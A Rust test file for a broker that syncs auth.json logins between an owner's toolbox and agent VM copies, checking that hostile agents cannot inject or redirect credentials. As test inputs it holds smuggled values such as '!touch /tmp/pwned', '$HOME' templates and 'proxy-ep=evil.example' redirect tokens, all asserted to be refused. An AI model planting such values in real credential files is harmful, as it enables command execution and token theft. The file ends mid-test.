use std::os::unix::fs::PermissionsExt;

use super::*;

const NOW: u64 = 1_800_000_000_000;

struct World {
    _tmp: tempfile::TempDir,
    broker: Broker,
    root: PathBuf,
}

fn world() -> World {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().to_owned();
    World {
        broker: Broker::new(root.join("store"), root.join("config"), root.join("pi.env")),
        root,
        _tmp: tmp,
    }
}

impl World {
    /// A copy with a directory, as `prepare_vm` makes one.
    fn copy(&self, name: &str) -> Copy {
        let copy = Copy {
            name: name.to_owned(),
            dir: self.root.join(name).join("agent"),
            state: self.root.join(name).join("state.json"),
            owner: false,
        };
        fs::create_dir_all(&copy.dir).unwrap();
        copy
    }

    fn toolbox(&self) -> Copy {
        Copy {
            owner: true,
            ..self.copy("toolbox")
        }
    }

    fn sync(&self, copy: &Copy) -> Synced {
        self.broker.sync(copy, NOW).unwrap()
    }

    fn done(&self, copy: &Copy) -> Report {
        match self.sync(copy) {
            Synced::Done(report) => report,
            other => panic!("{other:?}"),
        }
    }

    fn stored(&self) -> Map<String, Value> {
        self.broker.read_store().unwrap()
    }

    fn store_path(&self) -> PathBuf {
        self.broker.store_dir().join("auth.json")
    }

    /// Signs in as the toolbox would, on a copy that's been synced once.
    fn owner_signs_in(&self, text: &str) {
        let copy = self.toolbox();
        self.done(&copy);
        write(&copy, text);
        let report = self.done(&copy);
        assert!(!report.taken.is_empty(), "{report:?}");
    }

    fn pi_env(&self, text: &str) {
        fs::write(self.root.join("pi.env"), text).unwrap();
        fs::set_permissions(self.root.join("pi.env"), fs::Permissions::from_mode(0o600)).unwrap();
    }
}

fn write(copy: &Copy, text: &str) {
    fs::create_dir_all(&copy.dir).unwrap();
    let path = copy.dir.join("auth.json");
    let _ = fs::remove_file(&path);
    fs::write(path, text).unwrap();
}

fn held(copy: &Copy) -> Map<String, Value> {
    let text = fs::read_to_string(copy.dir.join("auth.json")).unwrap();
    parse_plain(&text).unwrap()
}

const COMMAND: &str = r#""openai":{"type":"api_key","key":"!touch /tmp/pwned"}"#;

fn oauth(access: &str, expires: u64) -> String {
    format!(
        r#"{{"anthropic":{{"type":"oauth","access":"{access}","refresh":"r-{access}","expires":{expires}}}}}"#
    )
}

#[test]
fn a_sign_in_in_the_toolbox_reaches_every_copy() {
    let w = world();
    let (a, b) = (w.copy("a"), w.copy("b"));
    w.done(&a);
    w.done(&b);
    w.owner_signs_in(&oauth("owner", NOW + 1000));
    assert_eq!(w.stored()["anthropic"]["access"], "owner");
    assert_eq!(
        fs::metadata(w.store_path()).unwrap().permissions().mode() & 0o777,
        0o600
    );
    w.done(&a);
    w.done(&b);
    assert_eq!(held(&a)["anthropic"]["access"], "owner");
    assert_eq!(held(&b)["anthropic"]["access"], "owner");
    assert!(!a.dir.join("auth.json.lock").exists(), "its lock is let go");
}

#[test]
fn a_refresh_in_one_vm_reaches_the_others() {
    let w = world();
    let (a, b) = (w.copy("a"), w.copy("b"));
    w.owner_signs_in(&oauth("first", NOW + 1000));
    w.done(&a);
    w.done(&b);
    write(&a, &oauth("second", NOW + 2000));
    let report = w.done(&a);
    assert_eq!(report.taken, ["anthropic"]);
    assert!(report.first.is_empty());
    assert_eq!(w.stored()["anthropic"]["access"], "second");
    w.done(&b);
    assert_eq!(held(&b)["anthropic"]["access"], "second");
    // Nor does anything change once it's all in step.
    assert_eq!(w.done(&a), Report::default());
}

#[test]
fn two_refreshes_at_once_leave_the_later_one() {
    let w = world();
    let (a, b) = (w.copy("a"), w.copy("b"));
    w.owner_signs_in(&oauth("first", NOW + 1000));
    w.done(&a);
    w.done(&b);
    write(&a, &oauth("later", NOW + 3000));
    write(&b, &oauth("sooner", NOW + 2000));
    w.done(&a);
    assert_eq!(w.done(&b).kept, ["anthropic"]);
    assert_eq!(w.stored()["anthropic"]["access"], "later");
    // And the loser is given it, so it recovers at its next request.
    assert_eq!(held(&b)["anthropic"]["access"], "later");
}

/// B1: what real Pi writes, field for field, from its source.
#[test]
fn what_pi_really_writes_is_a_login() {
    for (what, entry) in [
        (
            "Copilot's models, github-copilot.ts",
            r#"{"type":"oauth","refresh":"gho_x","access":"tid=1;exp=2;proxy-ep=proxy.individual.githubcopilot.com","expires":1800000900000,"enterpriseUrl":"corp.example","availableModelIds":["gpt-5","claude-sonnet-4"]}"#,
        ),
        (
            "ChatGPT's scopes, openai-chatgpt.ts",
            r#"{"type":"oauth","access":"a","refresh":"r","expires":1800000900000,"clientId":"app_1","scopes":["openid","offline_access"]}"#,
        ),
        (
            "Codex's account, openai-codex.ts",
            r#"{"type":"oauth","access":"a","refresh":"r","expires":1800000900000,"accountId":"acct-1"}"#,
        ),
        (
            "Radius's scope, radius.ts",
            r#"{"type":"oauth","access":"a","refresh":"r","expires":1800000900000,"scope":"read write"}"#,
        ),
        (
            "Cloudflare's env, cloudflare-auth.ts",
            r#"{"type":"api_key","key":"cf","env":{"CLOUDFLARE_ACCOUNT_ID":"abc","CLOUDFLARE_GATEWAY_ID":"gw"}}"#,
        ),
        ("a plain key", r#"{"type":"api_key","key":"sk-1"}"#),
        (
            "Bedrock's credential chain, amazon-bedrock.ts",
            r#"{"type":"api_key"}"#,
        ),
        (
            "Bedrock's profile, amazon-bedrock.ts",
            r#"{"type":"api_key","env":{"AWS_PROFILE":"work"}}"#,
        ),
        (
            "Vertex's service account, google-vertex.ts",
            r#"{"type":"api_key","env":{"GOOGLE_CLOUD_PROJECT":"p","GOOGLE_CLOUD_LOCATION":"us-east1","GOOGLE_APPLICATION_CREDENTIALS":"/home/vibe/sa.json"}}"#,
        ),
    ] {
        let value: Value = serde_json::from_str(entry).unwrap();
        assert_eq!(plain_entry(&value), Ok(()), "{what}");
    }
}

/// B1: the owner signs in to Anthropic and to Copilot in the toolbox, and both
/// reach every agent.
#[test]
fn an_owners_copilot_login_reaches_everyone_beside_their_anthropic_one() {
    let w = world();
    let vm = w.copy("vm");
    w.owner_signs_in(
        r#"{"anthropic":{"type":"oauth","refresh":"r","access":"a","expires":1800000900000},
            "github-copilot":{"type":"oauth","refresh":"gho_x","access":"tid=1","expires":1800000900000,"availableModelIds":["gpt-5"]}}"#,
    );
    assert_eq!(w.stored().len(), 2);
    w.done(&vm);
    assert_eq!(held(&vm)["github-copilot"]["availableModelIds"][0], "gpt-5");
}

/// B1: a refresh may change the list of models, and that's no new identity.
#[test]
fn a_copilot_refresh_with_new_models_goes_through() {
    let w = world();
    let login = |expires: u64, models: &str| {
        format!(
            r#"{{"github-copilot":{{"type":"oauth","refresh":"r{expires}","access":"tid=1;proxy-ep=proxy.individual.githubcopilot.com","expires":{expires},"availableModelIds":[{models}]}}}}"#
        )
    };
    w.owner_signs_in(&login(NOW + 1, r#""a""#));
    let vm = w.copy("vm");
    w.done(&vm);
    write(&vm, &login(NOW + 2, r#""a","b""#));
    assert_eq!(w.done(&vm).taken, ["github-copilot"]);
}

/// B1: one bad entry doesn't take down the rest of the copy.
#[test]
fn a_bad_login_is_quarantined_alone() {
    let w = world();
    let (a, b) = (w.copy("a"), w.copy("b"));
    w.done(&a);
    w.done(&b);
    write(
        &a,
        &format!(r#"{{{COMMAND},"groq":{{"type":"api_key","key":"gsk"}}}}"#),
    );
    let report = w.done(&a);
    assert_eq!(report.taken, ["groq"], "the plain one goes on");
    assert!(report.bad["openai"].contains("run a command"), "{report:?}");
    assert_eq!(w.stored().keys().collect::<Vec<_>>(), ["groq"]);
    w.done(&b);
    assert_eq!(held(&b).keys().collect::<Vec<_>>(), ["groq"]);
    // It stands for as long as it's there, however often it's looked at, and it's
    // no sign-out from what the store has.
    assert!(w.done(&a).bad.contains_key("openai"));
    assert!(w.done(&a).bad.contains_key("openai"));
    assert!(
        fs::read_to_string(a.dir.join("auth.json"))
            .unwrap()
            .contains("!touch"),
        "left as it was"
    );
    // A new login from the owner takes its place, and it's over.
    w.owner_signs_in(r#"{"openai":{"type":"api_key","key":"sk-owner"}}"#);
    let report = w.done(&a);
    assert!(report.bad.is_empty(), "{report:?}");
    assert_eq!(held(&a)["openai"]["key"], "sk-owner");
}

/// N3: what a file can't be trusted for as a whole quarantines the copy, and
/// each kind of bad entry stays out.
#[test]
fn what_cant_be_read_as_logins_goes_nowhere() {
    let deep = format!("{}1{}", "[".repeat(200), "]".repeat(200));
    for (what, text) in [
        ("a big number", format!("{{\"x\":1e999,{COMMAND}}}")),
        ("a BOM", format!("\u{feff}{{{COMMAND}}}")),
        ("deep nesting", format!("{{\"x\":{deep},{COMMAND}}}")),
        ("not JSON", "not json".to_owned()),
        ("not an object", "[]".to_owned()),
    ] {
        let w = world();
        w.owner_signs_in(r#"{"groq":{"type":"api_key","key":"gsk-fine"}}"#);
        let (bad, good) = (w.copy("bad"), w.copy("good"));
        write(&bad, &text);
        let Synced::Quarantined(why) = w.sync(&bad) else {
            panic!("{what} wasn't quarantined");
        };
        assert!(why.contains("auth.json"), "{why}");
        assert_eq!(w.stored().keys().collect::<Vec<_>>(), ["groq"], "{what}");
        assert_eq!(
            fs::read_to_string(bad.dir.join("auth.json")).unwrap(),
            text,
            "{what}: left as it was"
        );
        assert!(!bad.dir.join("auth.json.lock").exists());
        // Every other copy goes on as before.
        w.done(&good);
        assert_eq!(held(&good).keys().collect::<Vec<_>>(), ["groq"]);
    }
    for (what, entry) in [
        ("a command", r#"{"type":"api_key","key":"!x"}"#),
        (
            "a command after a space",
            r#"{"type":"api_key","key":" !x"}"#,
        ),
        ("a template", r#"{"type":"api_key","key":"$HOME"}"#),
        ("a braced template", r#"{"type":"api_key","key":"${HOME}"}"#),
        (
            "a command in its env",
            r#"{"type":"api_key","key":"k","env":{"A":"!x"}}"#,
        ),
        (
            "a template in its env",
            r#"{"type":"api_key","key":"k","env":{"A":"$B"}}"#,
        ),
        (
            "a nested env",
            r#"{"type":"api_key","key":"k","env":{"A":{"B":"c"}}}"#,
        ),
        (
            "more than a key",
            r#"{"type":"api_key","key":"k","url":"evil.example"}"#,
        ),
        (
            "a command in a list",
            r#"{"type":"oauth","access":"a","refresh":"r","expires":1,"x":["!y"]}"#,
        ),
        (
            "a nested list",
            r#"{"type":"oauth","access":"a","refresh":"r","expires":1,"x":[["y"]]}"#,
        ),
        ("no tokens", r#"{"type":"oauth","expires":1}"#),
        ("another kind", r#"{"type":"other"}"#),
        ("not an object", "5"),
    ] {
        let value: Value = serde_json::from_str(entry).unwrap();
        assert!(plain_entry(&value).is_err(), "{what}");
        let w = world();
        let bad = w.copy("bad");
        write(&bad, &format!(r#"{{"openai":{entry}}}"#));
        assert!(w.done(&bad).bad.contains_key("openai"), "{what}");
        assert!(w.stored().is_empty(), "{what}");
    }
}

#[test]
fn a_link_where_the_login_should_be_is_never_followed() {
    let w = world();
    w.owner_signs_in(r#"{"groq":{"type":"api_key","key":"gsk"}}"#);
    let bad = w.copy("bad");
    let notes = w.root.join("notes");
    fs::write(&notes, format!("{{{COMMAND}}}")).unwrap();
    symlink(&notes, bad.dir.join("auth.json")).unwrap();
    let Synced::Quarantined(why) = w.sync(&bad) else {
        panic!("a link wasn't quarantined");
    };
    assert!(why.contains("link"), "{why}");
    // Nothing was written through it.
    assert!(fs::read_to_string(&notes).unwrap().contains("!touch"));
    assert_eq!(w.stored().keys().collect::<Vec<_>>(), ["groq"]);
}

#[test]
fn what_isnt_a_file_or_is_too_big_is_quarantined_unread() {
    let w = world();
    let bad = w.copy("bad");
    fs::create_dir_all(bad.dir.join("auth.json")).unwrap();
    assert!(matches!(w.sync(&bad), Synced::Quarantined(_)));

    // A sparse gigabyte, which reading whole would make real.
    let big = w.copy("big");
    let file = fs::File::create(big.dir.join("auth.json")).unwrap();
    file.set_len(1 << 30).unwrap();
    let Synced::Quarantined(why) = w.sync(&big) else {
        panic!("a gigabyte wasn't quarantined");
    };
    assert!(why.contains("MiB"), "{why}");

    // A pipe, which would block the read for ever.
    let pipe = w.copy("pipe");
    let path =
        std::ffi::CString::new(pipe.dir.join("auth.json").to_str().unwrap().as_bytes()).unwrap();
    // SAFETY: a valid path, and no memory is written.
    assert_eq!(unsafe { libc::mkfifo(path.as_ptr(), 0o600) }, 0);
    assert!(matches!(w.sync(&pipe), Synced::Quarantined(_)));
}

#[test]
fn a_lock_held_too_long_is_an_alert_and_a_file_there_at_once() {
    let w = world();
    let copy = w.copy("a");
    w.done(&copy);
    let lock = copy.dir.join("auth.json.lock");
    fs::create_dir(&lock).unwrap();
    assert_eq!(w.sync(&copy), Synced::Busy);
    assert_eq!(
        w.broker.sync(&copy, NOW + STUCK_AFTER_MS).unwrap(),
        Synced::Busy
    );
    let Synced::Quarantined(why) = w.broker.sync(&copy, NOW + STUCK_AFTER_MS + 1).unwrap() else {
        panic!("a stuck lock wasn't noticed");
    };
    assert!(why.contains("locked"), "{why}");
    assert!(lock.is_dir(), "not ours to take");
    // It's over once it's let go, and the wait starts afresh.
    fs::remove_dir(&lock).unwrap();
    w.done(&copy);
    fs::create_dir(&lock).unwrap();
    assert_eq!(
        w.broker.sync(&copy, NOW + 2 * STUCK_AFTER_MS).unwrap(),
        Synced::Busy
    );
    fs::remove_dir(&lock).unwrap();

    fs::write(&lock, "").unwrap();
    let Synced::Quarantined(why) = w.sync(&copy) else {
        panic!("a file at the lock wasn't noticed");
    };
    assert!(why.contains("isn't a lock"), "{why}");
    // Before a boot nothing can be holding it, whatever it is.
    clear_lock(&copy.dir);
    w.done(&copy);
}

/// N4: nothing an agent can leave stops the owner's next `/login`.
#[test]
fn the_owners_login_always_wins() {
    let w = world();
    let (hostile, toolbox) = (w.copy("hostile"), w.toolbox());
    w.done(&toolbox);
    w.owner_signs_in(&oauth("old", NOW + 1000));
    w.done(&hostile);
    // A far-off expiry a VM would like to keep.
    let far = NOW + MAX_EXPIRES_AHEAD_MS - 1;
    write(&hostile, &oauth("hostile", far));
    assert_eq!(w.done(&hostile).taken, ["anthropic"]);
    // An owner's login that expires sooner still replaces it.
    write(&toolbox, &oauth("owner", NOW + 1000));
    assert_eq!(w.done(&toolbox).taken, ["anthropic"]);
    assert_eq!(w.stored()["anthropic"]["access"], "owner");
    // And it's what the agent has next, overwriting its own.
    w.done(&hostile);
    assert_eq!(held(&hostile)["anthropic"]["access"], "owner");
    // So does a switch to a key, which a VM's couldn't do.
    write(
        &toolbox,
        r#"{"anthropic":{"type":"api_key","key":"owner-key"}}"#,
    );
    assert_eq!(w.done(&toolbox).taken, ["anthropic"]);
    assert_eq!(w.stored()["anthropic"]["key"], "owner-key");
    // And a sign-out is everyone's.
    write(&toolbox, "{}");
    assert_eq!(w.done(&toolbox).removed, ["anthropic"]);
    assert!(w.stored().is_empty());
    w.done(&hostile);
    assert!(held(&hostile).is_empty());
}

#[test]
fn an_agent_can_only_do_what_a_sign_in_or_a_refresh_does() {
    let w = world();
    w.owner_signs_in(&oauth("owner", NOW + 1000));
    let a = w.copy("a");
    w.done(&a);
    let kept = |text: String, what: &str| {
        write(&a, &text);
        assert_eq!(w.done(&a).kept, ["anthropic"], "{what}");
        assert_eq!(w.stored()["anthropic"]["access"], "owner", "{what}");
    };
    kept(oauth("hostile", NOW + 1000), "the same expiry");
    kept(oauth("hostile", NOW), "an earlier expiry");
    kept(
        r#"{"anthropic":{"type":"api_key","key":"attacker"}}"#.to_owned(),
        "a key for a login",
    );
    kept(
        format!(
            r#"{{"anthropic":{{"type":"oauth","access":"a","refresh":"r","expires":{},"enterpriseUrl":"evil.example"}}}}"#,
            NOW + 5000
        ),
        "the same login, sent elsewhere",
    );
    write(&a, &oauth("hostile", NOW + MAX_EXPIRES_AHEAD_MS + 1));
    assert!(
        w.done(&a).refused["anthropic"].contains("far off"),
        "an expiry that outlasts every refresh"
    );
    // Left in its own copy, not the store's, and not undone until there's
    // something new to give it.
    write(&a, &oauth("its-own", NOW));
    w.done(&a);
    assert_eq!(w.done(&a), Report::default());
    assert_eq!(held(&a)["anthropic"]["access"], "its-own");
    // Signing out applies to that VM alone, and stays until a new login.
    write(&a, "{}");
    assert_eq!(w.done(&a), Report::default());
    assert!(held(&a).is_empty());
    assert_eq!(w.stored()["anthropic"]["access"], "owner");
    w.owner_signs_in(&oauth("newer", NOW + 2000));
    w.done(&a);
    assert_eq!(held(&a)["anthropic"]["access"], "newer");
}

#[test]
fn a_first_sign_in_in_an_agent_reaches_the_others_and_the_owner_is_told() {
    let w = world();
    let (a, b) = (w.copy("a"), w.copy("b"));
    w.done(&a);
    write(&a, r#"{"openai":{"type":"api_key","key":"sk"}}"#);
    assert_eq!(w.done(&a).first, ["openai"]);
    w.done(&b);
    assert_eq!(held(&b)["openai"]["key"], "sk");
    // B4: it stands, and not for this tick alone.
    let said = w.broker.notices(NOW + 1);
    assert_eq!(said.len(), 1);
    assert!(said[0].starts_with("a signed in to openai"), "{said:?}");
    assert!(
        w.broker.notices(NOW + NOTICE_FOR_MS).is_empty(),
        "it passes"
    );
    // Until the owner signs in to it themselves.
    w.owner_signs_in(r#"{"openai":{"type":"api_key","key":"sk-owner"}}"#);
    assert!(w.broker.notices(NOW + 1).is_empty());
}

/// A hostile agent can't bury its own first sign-in under what it gets refused.
#[test]
fn nothing_refused_pushes_a_first_sign_in_out_of_sight() {
    let w = world();
    let a = w.copy("a");
    write(&a, r#"{"openai":{"type":"api_key","key":"sk"}}"#);
    assert_eq!(w.done(&a).first, ["openai"]);
    for round in 0..MAX_NOTICES + 10 {
        write(
            &a,
            &format!(
                r#"{{"openai":{{"type":"api_key","key":"sk"}},"p{round}":{{"type":"api_key","key":"{}"}}}}"#,
                "k".repeat(MAX_AGENT_ENTRY + 1)
            ),
        );
        assert!(w.done(&a).refused.contains_key(&format!("p{round}")));
    }
    let said = w.broker.notices(NOW + 1);
    assert_eq!(said.len(), MAX_NOTICES);
    assert!(said.iter().any(|t| t.starts_with("a signed in to openai")));
    // The same thing refused again is said once.
    let w = world();
    let a = w.copy("a");
    for round in 0..3 {
        write(
            &a,
            &format!(
                r#"{{"p":{{"type":"api_key","key":"{}{round}"}}}}"#,
                "k".repeat(MAX_AGENT_ENTRY + 1)
            ),
        );
        w.done(&a);
    }
    assert_eq!(w.broker.notices(NOW + 1).len(), 1);
}

#[test]
fn a_first_sign_in_that_says_where_it_goes_stays_where_it_is() {
    for (name, entry) in [
        (
            "github-copilot",
            format!(
                r#"{{"type":"oauth","access":"a","refresh":"r","expires":{},"enterpriseUrl":"evil.example"}}"#,
                NOW + 1
            ),
        ),
        (
            "cloudflare-ai-gateway",
            r#"{"type":"api_key","key":"k","env":{"CLOUDFLARE_ACCOUNT_ID":"attacker","CLOUDFLARE_GATEWAY_ID":"gw"}}"#
                .to_owned(),
        ),
    ] {
        let w = world();
        let a = w.copy("a");
        write(&a, &format!(r#"{{"{name}":{entry}}}"#));
        let report = w.done(&a);
        assert!(report.refused[name].contains("where"), "{report:?}");
        assert!(!w.stored().contains_key(name));
        assert!(
            w.broker.notices(NOW + 1)[0].contains("wasn't passed on"),
            "the owner hears"
        );
    }
    // The same from the owner is the owner's to do.
    let w = world();
    w.owner_signs_in(
        r#"{"cloudflare-ai-gateway":{"type":"api_key","key":"k","env":{"CLOUDFLARE_ACCOUNT_ID":"mine"}}}"#,
    );
    assert_eq!(w.stored().len(), 1);
}

/// B5: Pi's own expression, unanchored, over every string.
#[test]
fn a_token_that_sends_requests_elsewhere_stays_where_it_is() {
    for (what, access) in [
        ("outside", "tid=1;proxy-ep=attacker.example"),
        ("a space before", "tid=1; proxy-ep=evil.example"),
        ("a prefixed name", "tid=1;xproxy-ep=evil.example"),
        ("a slash", "tid=1;proxy-ep=evil.example/.githubcopilot.com"),
        (
            "a fragment",
            "tid=1;proxy-ep=evil.example#.githubcopilot.com",
        ),
        (
            "the suffix inside",
            "tid=1;proxy-ep=x.githubcopilot.com.evil.example",
        ),
        ("no name before it", "tid=1;proxy-ep=.githubcopilot.com"),
        (
            "capitals",
            "tid=1;proxy-ep=EVIL.githubcopilot.com@evil.example",
        ),
        ("an empty one first", "proxy-ep=;proxy-ep=evil.example"),
        (
            "a good one first",
            "proxy-ep=a.githubcopilot.com;proxy-ep=evil.example",
        ),
        ("a port", "proxy-ep=evil.example:443"),
        ("a newline", "proxy-ep=a.githubcopilot.com\\nevil"),
    ] {
        let w = world();
        let login = |access: &str, expires: u64| {
            format!(
                r#"{{"github-copilot":{{"type":"oauth","access":"{access}","refresh":"r","expires":{expires}}}}}"#
            )
        };
        w.owner_signs_in(&login(
            "tid=1;proxy-ep=proxy.individual.githubcopilot.com",
            NOW + 1,
        ));
        let (a, other) = (w.copy("a"), w.copy("other"));
        w.done(&a);
        write(&a, &login(access, NOW + 2));
        let report = w.done(&a);
        assert!(
            report.refused.contains_key("github-copilot")
                || report.bad.contains_key("github-copilot"),
            "{what}: {report:?}"
        );
        w.done(&other);
        assert!(
            !fs::read_to_string(other.dir.join("auth.json"))
                .unwrap()
                .contains("evil"),
            "{what}"
        );
    }
    // In any field of it, in a list or a map too.
    let w = world();
    let a = w.copy("a");
    write(
        &a,
        &format!(
            r#"{{"p":{{"type":"oauth","access":"a","refresh":"r","expires":{},"availableModelIds":["proxy-ep=evil.example"]}}}}"#,
            NOW + 1
        ),
    );
    assert!(w.done(&a).refused.contains_key("p"));
    // A real refresh goes through.
    let w = world();
    let login = |host: &str, expires: u64| {
        format!(
            r#"{{"github-copilot":{{"type":"oauth","access":"tid=1;proxy-ep={host};exp=2","refresh":"r","expires":{expires}}}}}"#
        )
    };
    w.owner_signs_in(&login("proxy.individual.githubcopilot.com", NOW + 1));
    let a = w.copy("a");
    w.done(&a);
    write(&a, &login("proxy.enterprise-1.githubcopilot.com", NOW + 4));
    assert_eq!(w.done(&a).taken, ["github-copilot"]);
}

/// B6: in Pi a stored login owns its provider, and a key is only looked at when
/// there's none.
#[test]
fn an_agents_first_sign_in_cant_override_a_key_of_the_owners() {
    let w = world();
    w.pi_env("OPENROUTER_API_KEY=mine\n");
    let a = w.copy("a");
    write(&a, r#"{"openrouter":{"type":"api_key","key":"attacker"}}"#);
    let report = w.done(&a);
    assert!(
        report.refused["openrouter"].contains("key of your own"),
        "{report:?}"
    );
    assert!(w.stored().is_empty());
    assert!(w.broker.notices(NOW + 1)[0].contains("wasn't passed on"));
    // Nor one in the owner's models.json.
    fs::create_dir_all(w.root.join("config")).unwrap();
    fs::write(
        w.root.join("config/models.json"),
        r#"{"providers":{"xai":{"apiKey":"mine"}}}"#,
    )
    .unwrap();
    write(&a, r#"{"xai":{"type":"api_key","key":"attacker"}}"#);
    assert!(w.done(&a).refused.contains_key("xai"));
    // Another provider, or the owner, is free to.
    write(&a, r#"{"groq":{"type":"api_key","key":"k"}}"#);
    assert_eq!(w.done(&a).first, ["groq"]);
    w.owner_signs_in(r#"{"openrouter":{"type":"api_key","key":"owner"}}"#);
    assert_eq!(w.stored()["openrouter"]["key"], "owner");
    // Not being able to tell is as good as there being one.
    let w = world();
    w.pi_env("OPENAI_API_KEY=mine\n");
    fs::set_permissions(w.root.join("pi.env"), fs::Permissions::from_mode(0o644)).unwrap();
    let a = w.copy("a");
    write(&a, r#"{"groq":{"type":"api_key","key":"k"}}"#);
    assert!(w.done(&a).refused["groq"].contains("pi.env"));
}

/// B2: an agent can't fill the store, by size or by number.
#[test]
fn an_agent_cant_fill_the_store() {
    let w = world();
    let (hostile, toolbox, other) = (w.copy("hostile"), w.toolbox(), w.copy("other"));
    w.done(&toolbox);
    w.done(&other);
    // One big one.
    let big = "k".repeat(900 * 1024);
    write(
        &hostile,
        &format!(r#"{{"junk":{{"type":"api_key","key":"{big}"}}}}"#),
    );
    assert!(w.done(&hostile).refused["junk"].contains("bigger"));
    assert!(w.stored().is_empty());
    // Many that fit, each dropped again as the last one was.
    let size = "k".repeat(MAX_AGENT_ENTRY - 100);
    for round in 0..40 {
        write(
            &hostile,
            &format!(r#"{{"junk-{round}":{{"type":"api_key","key":"{size}"}}}}"#),
        );
        w.done(&hostile);
    }
    let bytes = fs::metadata(w.store_path()).unwrap().len() as usize;
    assert!(bytes <= MAX_AGENT_STORE + MAX_AGENT_ENTRY, "{bytes}");
    let said = w.broker.notices(NOW + 1);
    assert!(said.len() <= MAX_NOTICES, "{}", said.len());
    assert!(said.iter().any(|t| t.contains("no more room")), "{said:?}");
    // Many small ones.
    let w = world();
    let hostile = w.copy("hostile");
    for round in 0..MAX_AGENT_PROVIDERS + 5 {
        write(
            &hostile,
            &format!(r#"{{"junk-{round}":{{"type":"api_key","key":"k"}}}}"#),
        );
        w.done(&hostile);
    }
    assert_eq!(w.stored().len(), MAX_AGENT_PROVIDERS);
    // Everything else carries on, and the owner can always sign in, and clear it.
    let (toolbox, other, new) = (w.toolbox(), w.copy("other"), w.copy("new"));
    w.done(&other);
    w.done(&toolbox);
    let mut all = held(&toolbox);
    all.insert(
        "anthropic".to_owned(),
        serde_json::json!({"type":"api_key","key":"owner"}),
    );
    write(&toolbox, &Value::Object(all).to_string());
    assert_eq!(w.done(&toolbox).taken, ["anthropic"]);
    w.done(&new);
    assert_eq!(held(&new)["anthropic"]["key"], "owner");
}

/// B2: the owner's own sign-in gets through past what agents may fill, and what
/// agents offered makes way for it, so every copy stays readable.
#[test]
fn an_owners_big_sign_in_gets_through_and_every_copy_stays_readable() {
    let w = world();
    let (hostile, toolbox, other) = (w.copy("hostile"), w.toolbox(), w.copy("other"));
    w.done(&toolbox);
    let size = "k".repeat(MAX_AGENT_ENTRY - 100);
    for round in 0..8 {
        write(
            &hostile,
            &format!(r#"{{"junk-{round}":{{"type":"api_key","key":"{size}"}}}}"#),
        );
        w.done(&hostile);
    }
    let big = "o".repeat(pi::MAX_AUTH_FILE as usize - 64 * 1024);
    write(
        &toolbox,
        &format!(r#"{{"mine":{{"type":"api_key","key":"{big}"}}}}"#),
    );
    w.done(&toolbox);
    assert_eq!(w.stored()["mine"]["key"].as_str().unwrap().len(), big.len());
    assert!(fs::metadata(w.store_path()).unwrap().len() <= pi::MAX_AUTH_FILE);
    w.done(&other);
    assert!(held(&other).contains_key("mine"));
    // And more than a copy can hold is said, with the store left as it was.
    let bigger = "o".repeat(pi::MAX_AUTH_FILE as usize - 64);
    write(
        &toolbox,
        &format!(
            r#"{{"mine":{{"type":"api_key","key":"{bigger}"}},"more":{{"type":"api_key","key":"k{}"}}}}"#,
            "k".repeat(30)
        ),
    );
    let got = w.sync(&toolbox);
    assert!(
        matches!(&got, Synced::Quarantined(why) if why.contains("MiB")),
        "{got:?}"
    );
    assert_eq!(w.stored()["mine"]["key"].as_str().unwrap().len(), big.len());
}

/// R1: Pi writes a login with no key for Bedrock and Vertex. The owner's goes
/// through; an agent's would sign everyone in from what's around them.
#[test]
fn a_login_with_no_key_is_the_owners_alone_to_share() {
    for (name, entry) in [
        ("amazon-bedrock", r#"{"type":"api_key"}"#),
        (
            "amazon-bedrock",
            r#"{"type":"api_key","env":{"AWS_PROFILE":"work"}}"#,
        ),
        (
            "google-vertex",
            r#"{"type":"api_key","env":{"GOOGLE_CLOUD_PROJECT":"p","GOOGLE_CLOUD_LOCATION":"l"}}"#,
        ),
    ] {
        let w = world();
        let (a, b) = (w.copy("a"), w.copy("b"));
        write(&a, &format!(r#"{{"{name}":{entry}}}"#));
        assert!(w.done(&a).refused.contains_key(name), "{entry}");
        assert!(w.stored().is_empty(), "{entry}");
        w.owner_signs_in(&format!(r#"{{"{name}":{entry}}}"#));
        assert!(w.stored().contains_key(name), "{entry}");
        w.done(&b);
        assert!(held(&b).contains_key(name), "{entry}");
    }
}

/// R2: what fills the store stops new providers, not the logins already there.
#[test]
fn a_full_store_stops_new_providers_and_never_a_refresh() {
    let w = world();
    let (hostile, vm, other) = (w.copy("hostile"), w.copy("vm"), w.copy("other"));
    w.owner_signs_in(&oauth("first", NOW + 1000));
    let size = "k".repeat(MAX_AGENT_ENTRY - 100);
    for round in 0..40 {
        write(
            &hostile,
            &format!(r#"{{"junk-{round}":{{"type":"api_key","key":"{size}"}}}}"#),
        );
        w.done(&hostile);
    }
    let full = fs::metadata(w.store_path()).unwrap().len() as usize;
    assert!(full > MAX_AGENT_STORE - MAX_AGENT_ENTRY, "{full}");
    write(
        &vm,
        &format!(r#"{{"xai":{{"type":"api_key","key":"{size}"}}}}"#),
    );
    let report = w.done(&vm);
    assert!(report.refused["xai"].contains("no more room"), "{report:?}");
    // A rotated token still goes everywhere.
    w.done(&other);
    let mut entries = held(&other);
    entries.insert(
        "anthropic".to_owned(),
        parse_plain(&oauth("second", NOW + 2000)).unwrap()["anthropic"].clone(),
    );
    write(&other, &Value::Object(entries).to_string());
    assert_eq!(w.done(&other).taken, ["anthropic"]);
    assert_eq!(w.stored()["anthropic"]["access"], "second");
    // Held only to what one login may be.
    let big = format!(
        r#"{{"anthropic":{{"type":"oauth","access":"{}","refresh":"r","expires":{}}}}}"#,
        "a".repeat(MAX_AGENT_ENTRY),
        NOW + 3000
    );
    let mut entries = held(&other);
    entries.insert(
        "anthropic".to_owned(),
        parse_plain(&big).unwrap()["anthropic"].clone(),
    );
    write(&other, &Value::Object(entries).to_string());
    assert!(w.done(&other).refused["anthropic"].contains("bigger"));
    assert_eq!(w.stored()["anthropic"]["access"], "second");
}

/// R2: an agent inflating every login there is, as far as each may go, by refresh
/// after refresh, leaves every copy readable.
#[test]
fn nothing_agents_can_do_makes_a_copy_unreadable() {
    let w = world();
    let (hostile, other, toolbox) = (w.copy("hostile"), w.copy("other"), w.toolbox());
    let login = |round: usize, access: &str, expires: u64| {
        format!(
            r#""p{round}":{{"type":"oauth","access":"{access}","refresh":"r","expires":{expires}}}"#
        )
    };
    // As many providers as may be offered, one at a time.
    let mut all = Vec::new();
    for round in 0..MAX_AGENT_PROVIDERS {
        all.push(login(round, "a", NOW + 1));
        write(&hostile, &format!("{{{}}}", all.join(",")));
